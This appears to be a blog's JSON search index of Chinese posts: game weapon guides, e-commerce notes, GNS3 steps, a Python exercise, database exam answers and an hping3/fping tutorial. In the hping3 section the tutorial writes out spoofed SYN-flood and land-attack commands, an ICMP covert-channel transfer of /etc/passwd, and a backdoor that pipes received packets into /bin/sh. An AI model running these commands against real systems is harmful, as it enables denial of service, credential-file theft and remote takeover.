连击：匕首的连击次数是6，但是没有重击终结技，只有轻击终结技。同时重击只计算一次连击，也就是无论几次重击，下一次轻击都算作第2次连击。轻击倍率只有0.45，重击倍率是1，另外第4次轻击和第5次轻击为两次攻击。第2次轻击和第3次轻击连携非常快看起来像一次二连击，实际上保持间隔连续点击轻击可以看到是两次攻击。终结轻击的倍率是2，在匕首的招式中算是倍率比较高的了，而且对于不是霸体类佣兵也很容易打出来。 常用连击：匕首通常用重击起手接近目标，然后是快速的几次轻击，然后用闪避、格挡或者继续重击轻击连击，由于攻速很快可以在实战中随机应变的使用，没有什么特定的连招。应对喜欢后腿的敌人如山猫、弓箭手和领袖等时，可以用连续重击突进。虽然轻击终结技的威力在匕首招式中算是比较高，但也没必要强求打出来，保持灵活的节奏是匕首的关键。 2. 闪避攻击：匕首的闪避攻击可以当做普通的攻击来用，没有什么特殊的用途。闪避轻击比常规轻击起手还慢一些，但是也没多少影响；闪避重击比普通重击出伤害的速度要快一点（指按出重击键之后，不是从闪避开始算），突进的距离也差不多，没必要特意使用，闪避之后自然就用出来了，当作普通的轻重击即可。 3. 格挡反击：由于匕首没有终结重击，所以格挡之后基本也就是继续重击突进，然后轻击连击，跟普通连击区别不大，没有什么特别需要注意的地方。 4. 蓄力重击：匕首的蓄力重击起手慢，蓄力完成之后人要在空中转一圈才能出伤害，并且倍率也低，是全武器种最低的2，虽然有一个突进的动作但这个转圈的前摇大大影响了突进的实用性，反而容易突进到敌人脸上被打，虽然蓄力重击是霸体被打中也不会影响自身出手，但就没有满血暴击暴伤了。基本上也跟长矛一样是没用的招式。 5. 狂袭：匕首的狂袭基本跟刀剑一样，也是无法对动画中的敌人暴击，区别在于匕首的狂袭倍率还要低一些，是12段1.2的倍率。关于狂袭本文就不多介绍。","link":"/2019/04/02/刺客信条奥德赛武器技巧之匕首/"},{"title":"刺客信条奥德赛武器技巧之锤","text":"综述：大锤是一个上手很难，即使熟练之后缺陷也非常明显的武器。虽然有着极高的招式倍率，除了轻击低于斧子之外其他各项招式的倍率都遥遥领先其他武器，但是速度实在是太慢，在不用时间减缓等技能辅助的情况下基本只能依赖格挡和闪避来打防守反击。当遇到较多远程敌人比如雅典神箭手时，在反击的过程中也很容易死于远处的流矢。单挑的时候活用格挡和闪避可以利用极高的伤害来迅速击杀敌人，主动出手则要看敌方的AI和运气。 1. 连击：大锤的连击次数是3，为全武器最少，但是攻速过于缓慢使得要打出终结技非常困难。轻击倍率是1.7比斧子还低，但是动作却比斧子慢很多，因此轻击不太实用，普通连击以重击为主，不过第二击的重击特别慢，一般是不会用2重的。格挡取消攻击后摇的技巧对于大锤特别重要，可以在一次重击之后用格挡迅速取消后摇，然后打出第二次重击，虽然连击次数会重置也就是一直从第一次开始计算，但是可以更容易击中目标。 常用连击：轻轻重，重轻重。终结重击有惊人的4.8倍率，甚至终结轻击也有3.4的倍率超过所有其他武器的终结重击倍率，但是在不用时间减缓的情况下很难施展出来并且命中敌人。终结轻击速度和终结重击差不多因此如果打终结技还是以终结重击为主。 2. 闪避攻击：闪避轻击是大锤起手最快的一招，但是仍然比较缓慢，不过挥舞的幅度比较大，可以用来范围攻击，也可以闪避到敌人的侧面用闪避轻击起手，比单纯的轻击起手更容易命中。闪避重击是带跳跃的一次下砸，攻击距离比较远，可以预判敌人的行为来使用，需要对敌人的动作熟悉，也需要一定的运气，很容易在跳在空中的时候受到攻击。 3. 格挡反击：大锤的格挡反击是主要输出招式。格挡之后重击可以立即打出4.8倍率的终结技，并且相对其他武器来说大锤的终结技速度并不算很慢，在格挡成功之后很容易命中；不过跟刀剑的格挡重击问题类似，攻击距离过短，如果在较远的距离格挡，那么格挡重击是无法命中目标的，这时候可以选择用闪避重击或者蓄力重击追击。 4. 蓄力重击：大锤的蓄力重击是比较重要的一个招式。拥有全武器最高的3.9倍率，同时起手也比较快，虽然不如刀剑，但比匕首快一点，可以像刀剑一样看准敌人的破绽先行秒杀敌人，但是使用难度更大一些。另外，蓄力重击的动作和起手重击是基本一样的，在没蓄满的情况下松开就是普通重击，可以随机应变的变招使用。另外，格挡之后蓄力重击基本能够稳定的命中，伤害比格挡重击要高一些，同时人物也可以在蓄力过程中走位和观察，但也有可能导致本来能够打出的反击无法打出，因为格挡的同时能对周围的敌人造成一定的硬直，此时格挡重击是很难被近处的敌人攻击到的；而蓄力重击完成之后敌人的硬直可能已经消失，在攻击的过程中就可能被打。 5. 大锤的狂袭和斧子一样，是单体两段6.9倍率的攻击，在有多个敌人时可以连续施放4次，对进入动画的敌人无法暴击。关于狂袭本文就不多介绍。","link":"/2019/04/02/刺客信条奥德赛武器技巧之锤/"},{"title":"电商一","text":"一，电子商务基本知识 狭义电子商务（EC）：单纯的从商品或服务的交易角度定义的电子商务成为electronic commerce。EC反映的是客户（个人或企业）与产品或服务提供商（如生产企业，零售商等）之间的商务关系。 广义电子商务（EB）：从整个供应链角度定义的电子商务通常称为electronic business。是指企业从原料供应到生产分销零售等全部经营过程与经营活动的信息化，网络化。公司内部部门之间以及公司与供应商分销商零售商直至客户之间的协同和信息共享是EB的主要特征。他反应的是一种更为广泛的商业关系。 移动商务（MC）：移动商务mobile commerce是指电子商务交易和活动的全部或部分在移动互联网环境下完成，许多移动商务应用包含能够接入互联网的移动设备。 电子商务柱状框架","link":"/2019/06/27/电商基础/"},{"title":"GNS3桥接VMware虚拟机","text":"1.打开GNS3中的设置 2.选择VMware vms点击new 3.选择在本地计算机运行,点击下一步 4.选择需要添加的虚拟机,点击finish 5.编辑创建完成的vms,按如下图所示设置 最后在主界面拖出来即可使用","link":"/2019/11/26/GNS3桥接VMware虚拟机/"},{"title":"python练习--同符号数学运算","text":"同符号数学运算 描述读入一个整数N，分别计算如下内容：‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬ N的绝对值；‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬ N与10进行同符号加法、减法和乘法运算，同符号运算指使用N的绝对值与另一个数进行运算，运算结果的绝对值被赋予N相同的符号，其中，0的符号是正号。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬ 将上述4项结果在一行输出，采用空格分隔，输出结果均为整数。 输入示例1:100 输出示例1:100 110 90 1000 示例代码 1234567891011121314151617a = eval(input())a_abs = abs(a)a_add = a_abs+10a_cut = a_abs-10a_multi = a_abs*10if a &gt;= 0: a_add = abs(a_add) a_cut = abs(a_cut) a_multi = abs(a_multi)else: a_add = -abs(a_add) a_cut = -abs(a_cut) a_multi = -abs(a_multi)print(a_abs, end=&quot; &quot;)print(a_add, end=&quot; &quot;)print(a_cut, end=&quot; &quot;)print(a_multi)","link":"/2019/11/26/python练习-同符号三角运算-1/"},{"title":"hping3使用详解","text":"hping3 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hping 是面向命令行的用于生成和解析TCP/IP协议数据包汇编/分析的开源工具。作者是Salvatore Sanfilippo，界面灵感来自ping（8）unix命令，目前最新版是 hping3，它支持TCP，UDP，ICMP和RAW-IP协议，具有跟踪路由模式，能够在覆盖的信道之间发送文件以及许多其他功能，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping 优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然 hping 以前主要用作安全工具，但它可以在许多方面被不太关心安全性的人员用于测试网络和主机，您可以使用hping的一小部分内容： 123456789- 防火墙测试- 高级端口扫描- 网络测试，使用不同的协议，TOS，分片- 手动路径MTU发现- 在所有支持的协议下，高级traceroute- 远程操作系统指纹- 远程正常运行时间猜测- TCP/IP协议栈审计- hping也可以用于学习TCP/IP的学生 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990用法: hping3 host [options] -h --help 显示帮助 -v --version 显示版本 -c --count 发送数据包的数目 -i --interval 发送数据包间隔的时间 (uX即X微秒, 例如： -i u1000) --fast 等同 -i u10000 (每秒10个包) --faster 等同 -i u1000 (每秒100个包) --flood 尽最快发送数据包，不显示回复。 -n --numeric 数字化输出，象征性输出主机地址。 -q --quiet 安静模式 -I --interface 网卡接口 (默认路由接口) -V --verbose 详细模式 -D --debug 调试信息 -z --bind 绑定ctrl+z到ttl(默认为目的端口) -Z --unbind 取消绑定ctrl+z键 --beep 对于接收到的每个匹配数据包蜂鸣声提示模式选择 default mode TCP // 默认模式是 TCP -0 --rawip RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。 -1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。 -2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。 -8 --scan SCAN mode. //扫描模式 指定扫描对应的端口。 Example: hping --scan 1-30,70-90 -S www.target.host // 扫描 -9 --listen listen mode // 监听模式 IP 模式 -a --spoof spoof source address //源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。 --rand-dest random destionation address mode. see the man. // 随机目的地址模式。详细使用 man 命令 --rand-source random source address mode. see the man. // 随机源地址模式。详细使用 man 命令 -t --ttl ttl (默认 64) //修改 ttl 值 -N --id id (默认 随机) // hping 中的 ID 值，缺省为随机值 -W --winid 使用win* id字节顺序 //使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。 -r --rel 相对id字段(估计主机流量) //更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。 -f --frag 拆分数据包更多的frag. (may pass weak acl) //分段，可以测试对方或者交换机碎片处理能力，缺省16字节。 -x --morefrag 设置更多的分段标志 // 大量碎片，泪滴攻击。 -y --dontfrag 设置不分段标志 // 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。 -g --fragoff set the fragment offset // 设置断偏移。 -m --mtu 设置虚拟最大传输单元, implies --frag if packet size &gt; mtu // 设置虚拟MTU值，当大于mtu的时候分段。 -o --tos type of service (default 0x00), try --tos help // tos字段，缺省0x00，尽力而为？ -G --rroute includes RECORD_ROUTE option and display the route buffer // 记录IP路由，并显示路由缓冲。 --lsrr 松散源路由并记录路由 // 松散源路由 --ssrr 严格源路由并记录路由 // 严格源路由 -H --ipproto 设置IP协议字段，仅在RAW IP模式下使用 //在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。ICMP 模式 -C --icmptype icmp类型(默认echo请求) // ICMP类型，缺省回显请求。 -K --icmpcode icmp代号(默认0) // ICMP代码。 --force-icmp 发送所有icmp类型(默认仅发送支持的类型) // 强制ICMP类型。 --icmp-gw 设置ICMP重定向网关地址(默认0.0.0.0) // ICMP重定向 --icmp-ts 等同 --icmp --icmptype 13 (ICMP 时间戳) // icmp时间戳 --icmp-addr 等同 --icmp --icmptype 17 (ICMP 地址子网掩码) // icmp子网地址 --icmp-help 显示其他icmp选项帮助 // ICMP帮助UDP/TCP 模式 -s --baseport base source port (default random) // 缺省随机源端口 -p --destport [+][+]&lt;port&gt; destination port(default 0) ctrl+z inc/dec // 缺省随机源端口 -k --keep keep still source port // 保持源端口 -w --win winsize (default 64) // win的滑动窗口。windows发送字节(默认64) -O --tcpoff set fake tcp data offset (instead of tcphdrlen / 4) // 设置伪造tcp数据偏移量(取代tcp地址长度除4) -Q --seqnum shows only tcp sequence number // 仅显示tcp序列号 -b --badcksum (尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP/TCP校验和。 -M --setseq 设置TCP序列号 -L --setack 设置TCP的ack ------------------------------------- (不是 TCP 的 ACK 标志位) -F --fin set FIN flag -S --syn set SYN flag -R --rst set RST flag -P --push set PUSH flag -A --ack set ACK flag ------------------------------------- （设置 TCP 的 ACK 标志 位） -U --urg set URG flag // 一大堆IP抱头的设置。 -X --xmas set X unused flag (0x40) -Y --ymas set Y unused flag (0x80) --tcpexitcode 使用last tcp-&gt; th_flags作为退出码 --tcp-mss 启用具有给定值的TCP MSS选项 --tcp-timestamp 启用TCP时间戳选项来猜测HZ/uptimeCommon //通用设置 -d --data data size (default is 0) // 发送数据包大小，缺省是0。 -E --file 文件数据 -e --sign 添加“签名” -j --dump 转储为十六进制数据包 -J --print 转储为可打印字符 -B --safe 启用“安全”协议 -u --end 告诉你什么时候--file达到EOF并防止倒回 -T --traceroute traceroute模式(等同使用 --bind 且--ttl 1) --tr-stop 在traceroute模式下收到第一个不是ICMP时退出 --tr-keep-ttl 保持源TTL固定，仅用于监视一跳 --tr-no-rtt 不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定）ARS packet description (new, unstable) --apd-send 发送APD描述数据包(参见docs / APD.txt) hping3功能 防火墙测试 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。 hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10 端口扫描&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放： 1hping3 -I eth0 -S 192.168.10.1 -p 80 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中-I eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-p 80指定探测的目的端口。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。Idle扫描&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。拒绝服务攻击&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。 1hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其他攻击如smurf、teardrop、land attack等也很容易构建出来。文件传输&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务： 1hping3 192.168.1.159--listen signature --safe --icmp 监听ICMP包中的签名，根据签名解析出文件内容。在发送端使用签名打包的ICMP包发送文件： 1hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。木马功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。 在木马启动端： 1hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh 在远程控制端： 12echo ls &gt;test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。 fping 用法 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fping 是一个将 ICMP echo 探测器发送到网络主机的程序，类似于 ping，可以看作是 ping 的增强版。但是 fping 在 ping多个主机时性能更好。 12345678910111213141516171819202122232425262728293031323334353637Usage: fping [options] [targets...] -a 显示存活目标，即可ping通的目标 -A 将目标以ip地址的形式显示 -b n ping 数据包的大小。（默认为56） -B f set exponential backoff factor to f -c n ping每个目标的次数 (默认为1) -C n 同-c, 返回的结果为冗长格式 -D 每个输出行打印时间戳 -e 显示返回数据包所费时间 -f file 从文件获取目标列表( - 表示从标准输入)(不能与 -g 同时使用) -g 生成目标列表(不能与 -f 同时使用) (可指定目标的开始和结束IP， 或者提供ip的子网掩码) (例：fping -g 192.168.1.0 192.168.1.255 或 fping -g 192.168.1.0/24) -H n 设置ip的TTL值 (生存时间) -i n ping包之间的间隔(单位：毫秒)(默认25) -I if 绑定到特定的接口 -l 循环发送ping -m ping目标主机的多个网口 -M 设置不分段标记 -n 将目标以主机名或域名显示(等价于 -d ) -N 输出兼容netdata (-l -Q are required) -o 显示累计中断时间 (lost packets * packet interval) -O n 在ICMP包中设置服务的类型(tos)标志 -p n 对同一个目标的ping包间隔(毫秒) (在循环和统计模式中，默认为1000) -q 安静模式(不显示每个目标或每个ping的结果) -Q n 同-q, 但是每n秒显示信息概要 -r n 当ping失败时，最大重试次数(默认为3次) -R random packet data (to foil link data compression) -s 打印最后的统计数据 -S addr 设置源ip地址 -t n 单个目标的超时时间(毫秒)(默认500) -T n 请忽略(为兼容fping 2.4) -u 显示不可到达的目标 -v 显示版本号 targets 需要ping的目标列表(不能和 -f 同时使用) 例如 1fping -A -u -c 4 192.168.1.1 192.168.1.74 192.168.1.20","link":"/2019/11/25/hping3使用详解/"},{"title":"数据库期末简答","text":"1．试述数据、数据库、数据库系统、数据库管理系统的概念。 (1)数据(Data)：描述事物的符号记录称为数据。（数据的种类有数字、文字、图形、图像、 声音、正文等。数据与其语义是不可分的。） (2)数据库(DataBase，简称 DB)：数据库是长期储存在计算机内的、有组织的、可共享的数据集合。数据库中的数据按一定的数据模型组织、描述和储存，具有较小的冗余度、 较高的数据独立性和易扩展性，并可为各种用户共享。 (3)数据库系统(DataBase Sytem，简称 DBS)：数据库系统是由数据库、数据库管理系统(及其开发工具)、应用系统和数据库管理员组成的存储，管理，处理和维护数据的系统。 (4)数据库管理系统(DataBase Management Sytem，简称 DBMS)：数据库管理系统是位 于用户与操作系统之间的一层数据管理软件，用于科学地组织和存储数据、高效地获取和维护数据。DBMS 的主要功能包括数据定义功能、数据组织存储和管理、数据操纵功能、数据库的事务管理和运行管理功能、 数据库的建立和维护功能。 2．试述数据库系统的特点。 数据库系统的主要特点有： (1)数据结构化 数据库系统实现整体数据的结构化，这是数据库的主要特征之一，也是数据库系统与文件系统的本质区别。 (2)数据的共享性高，冗余度低，易扩充 (3)数据独立性高 数据独立性包括数据的物理独立性（用户的应用程序与数据库中数据的物理存储是相互独立的）和数据的逻辑独立性（是指用户的应用程序与数据库的逻辑结构是相互独立的）。 (4)数据由 DBMS 统一管理和控制 提供统一的数据控制功能，包括数据的安全性保护、数据的完整性检查、并发控制和数据库恢复。 3．数据库管理系统的主要功能有哪些? (1)数据库定义功能； （2）数据组织存储和管理 （3）数据操纵功能 (4)数据库的事务管理和运行管理； (5)数据库的建立和维护功能。 4 ．什么叫数据与程序的物理独立性？什么叫数据与程序的逻辑独立性？为什么数据库系统具有数据与程序的独立性？ 数据与程序的逻辑独立性：是指用户的应用程序与数据库的逻辑结构是相互独立的。当模式改变时（例如增加新的关系、新的属性、改变属性的数据类型等），由数据库管理员对各个外模式／模式的映像做相应改变，可以使外模式保持不变。应用程序是依据数据的外模式编写的，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。 数据与程序的物理独立性：用户的应用程序与数据库中数据的物理存储是相互独立的。当数据库的存储结构改变了，由数据库管理员对模式／内模式映像做相应改变，可以使模式保持不变，从而应用程序也不必改变，保证了数据与程序的物理独立性，简称数据的物理独立性。 数据库管理系统在三级模式之间提供的两层映像保证了数据库系统中的数据能够具有较高的逻辑独立性和物理独立性。 5.述关系模型的完整性规则。在参照完整性中，什么情况下外码属性的值可以为空值？ 答：关系模型的完整性规则是对关系的某种约束条件。关系模型中可以有三类完整性约束：实体完整性、参照完整性和用户定义的完整性。其中实体完整性和参照完整性是关系模型必须满足的完整性约束条件，被称作是关系的两个不变性，应该由关系系统自动支持。 （1）实体完整性规则：若属性A是基本关系R的主属性，则属性A不能取空值。 （2）参照完整性规则：若属性（或属性组）F是基本关系R的外码，它与基本关系S的主码Ks相对应（基本关系R和S不一定是不同的关系），则对于R中每个元组在F上的值必须为下面二者之一：或者取空值（F的每个属性值均为空值）；或者等于S中某个元组的主码值。 （3）用户定义的完整性是针对某一具体关系数据库的约束条件。它反映某一具体应用所涉及的数据必须满足的语义要求。 在参照完整性中，外部码属性的值可以为空，它表示该属性的值尚未确定。但前提条件是该外部码属性不是其所在关系的主属性。例如，在下面的“学生”表中，“专业号”是一个外部码，不是学生表的主属性，可以为空。其语义是，该学生的专业尚未确定。学生（学号，姓名，性别，专业号，年龄）专业（专业号，专业名）而在下面的“选修”表中的“课程号”虽然也是一个外部码属性，但它又是“选修”表的主属性，所以不能为空。因为关系模型必须满足实体完整性。课程（课程号，课程名，学分）选修（学号，课程号，成绩） 6.试述等值连接与自然连接的区别和联系。 连接运算中有两种最为重要也最为常用的连接，一种是等值连接（Equijoin），另一种是自然连接（Naturaljoin）。 等值连接简称等连接。θ为“＝”的连接运算称为等值连接。它是从关系R与S的笛卡尔积中选取A、B属性值相等的那些元组。 自然连接（Naturaljoin）是一种特殊的等值连接，它要求两个关系中进行比较的分量必须是相同的属性组，并且要在结果中把重复的属性去掉。即若R和S具有相同的属性组B。 7.什么是视图？试述视图的优点。 视图是从一个或几个基本表（或视图）导出的表。他与基本表不同，是一个虚表。 ( l ）视图能够简化用户的操作； ( 2 ）视图使用户能以多种角度看待同一数据； ( 3 ）视图对重构数据库提供了一定程度的逻辑独立性； ( 4 ）视图能够对机密数据提供安全保护。 （5）适当利用视图可以更清晰的表达查询 8.什么是数据库的完整性？ 数据库的完整性是指数据的正确性（数据是符合现实世界语义 反映当前实际状况的）和相容性（数据库同一对象在不同关系表中的数据是符合逻辑的）。 9.试述数据库设计过程。 数据库设计过程的六个阶段：第二步是关键 （1）需求分析 任务是通过调查,收集与分析数据,获得用户对数据要求: 信息要求:指用户需要从数据库中获得信息的内容与性质,再由信息要求导出数据要求 处理要求:指用户要完成什么处理功能,对初一响应时间有什么要求,处理方式是批处理还是联机处理 安全性与完整性要求 结果是得到的用户需求 （2）概念结构设计 任务：将需求分析得到的用户需求抽象为信息结构 结果：得到E-R模型 （3）逻辑结构设计 任务：将基本的E-R图转换为与选用数据库管理系统产品所支持的数据模型相符合的逻辑结构 结果：一组关系模式的集合 （4）物理结构设计 任务：为一个给定的逻辑数据模型选取一个最适合应用要求的物理结构。 结果：存储格式位置，访问方法交互界面的说明 （5）数据库实施 任务：根据逻辑和物理结构设计，建立数据库进行测试运行 结果：初步完成的数据库系统 （6）数据库运行和维护 任务：控制数据库完整性安全性，检测和维护改善数据库 结果：完整的数据库系统 10.试述事务的概念及事务的四个特性。恢复技术能保证事务的哪些特性？ 事务是用户定义的一个数据库操作序列，这些操作要么全做要么全不做,是一个不可分割的工作单位。 事务具有四个特性：原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）和持续性（Durability）。这个四个特性也简称为ACID特性。 原子性：事务是数据库的逻辑工作单位，事务中包括的诸操作要么都做，要么都不做。 一致性：事务执行的结果必须是使数据库从一个一致性状态变到另一个一致性状态。 隔离性：一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对其他并发事务是隔离的，并发执行的各个事务之间不能互相干扰。 持续性：持续性也称永久性（Permanence），指一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。接下来的其他操作或故障不应该对其执行结果有任何影响。 （恢复技术能保证的三个特性）为了保证事务的原子性、一致性与持续性，DBMS必须对事务故障、系统故障和介质故障进行恢复；为了保证事务的隔离性和一致性，DBMS需要对并发操作进行控制。 11.登记日志文件时为什么必须先写日志文件，后写数据库？ 把对数据的修改写到数据库中和把表示这个修改的日志记录写到日志文件中是两个不同的操作。有可能在这两个操作之间发生故障，即这两个写操作只完成了一个。 如果先写了数据库修改，而在运行记录中没有登记这个修改，则以后就无法恢复这个修改了。如果先写日志，但没有修改数据库，在恢复时只不过是多执行一次UNDO操作，并不会影响数据库的正确性。所以一定要先写日志文件，即首先把日志记录写到日志文件中，然后写数据库的修改。 12.什么是并发控制，在数据库中为什么要并发控制？并发控制技术能保证事务的哪些特性？ 并发控制指的是当多个用户同时更新运行时，用于保护数据库完整性的各种技术。 数据库是共享资源，通常有许多个事务同时在运行。 当多个事务并发地存取数据库时就会产生同时读取和/或修改同一数据的情况。若对并发操作不加控制就可能会存取和存储不正确的数据，破坏数据库的一致性。所以数据库管理系统必须提供并发控制机制。 并发控制可以保证事务的一致性和隔离性。 13.并发操作可能会产生哪几类数据不一致？用什么方法能避免各种不一致的情况？ 并发操作带来的数据不一致性包括三类：丢失修改、不可重复读和读“脏”数据。 （1）丢失修改（LostUpdate）两个事务T1和T2读入同一数据并修改，T2提交的结果破坏了（覆盖了）T1提交的结果，导致T1的修改被丢失。 （2）不可重复读（Non-RepeatableRead）不可重复读是指事务T1读取某一数据后，事务T2对其执行更新操作，使T1无法再现前一次读取结果。 （3）读“脏”数据（DirtyRead）读“脏”数据是指事务T1修改某一数据，并将其写回磁盘，事务T2读取同一数据后，T1由于某种原因被撤销，这时T1已修改过的数据恢复原值，T2读到的数据就与数据库中的数据不一致，则T2读到的数据就为“脏”数据，即不正确的数据。 避免不一致性的方法就是并发控制。最常用的并发控制技术是封锁技术。也可以用其他技术，例如在分布式数据库系统中，常常采用时间戳方法来进行并发控制。","link":"/2019/06/26/数据库期末简答/"},{"title":"电商之营销","text":"1、营销定义 是企业为了与客户建立关系，并促使其购买自己的产品和服务所采取的策略和行动。 核心：吸引客户+保留客户 菲利普.科特勒定义：市场营销是个人和群体通过创造并同他人交换产品和价值以满足需求和欲望的一种社会和管理过程。发现还没有被满足的需求并满足它。 2、网络营销广义定义 是指导组织和个人利用基于互联网，对产品、服务所做的一系列经营活动，从而达到满足组织或个人需求的全过程。 核心：与客户建立或维持积极的、长期的关系。 补：网络促销 定义：网络促销是指利用计算机及网络技术向虚拟市场传递有关商品和服务信息，以引发消费者需求，唤起购买欲望和促成购买行为的各种活动。 特点 网络促销是在Internet这个虚拟市环境下进行的。 网络促销通过网络传递商务和服务的存在、性能、功效及特征信息。 3.4p理论 产品（Product)、价格(Price)、渠道(Place)和促销/推广(Promotion) ，企业把他们综合运用，形成一个整体的过程，这就是营销组合。 4P理论的基本出发点是企业的利润，而没有把消费者的需求放到与企业的利润同等重要的位置上，它指导的营销决策是一条单向的链 产品（Product） 对于产品策略来说，要求厂家不要再墨守成规，只停留在销售企业目前制造的产品上。要多注意市场的变化和消费者的想法，在因特网上进行市场营销的产品和服务的调查，寻找满足和引导消费者的需求变化的新型产品与服务业务，制造新的消费概念和消费需求，开辟产品与服务创新的新领域。 价格（Price） 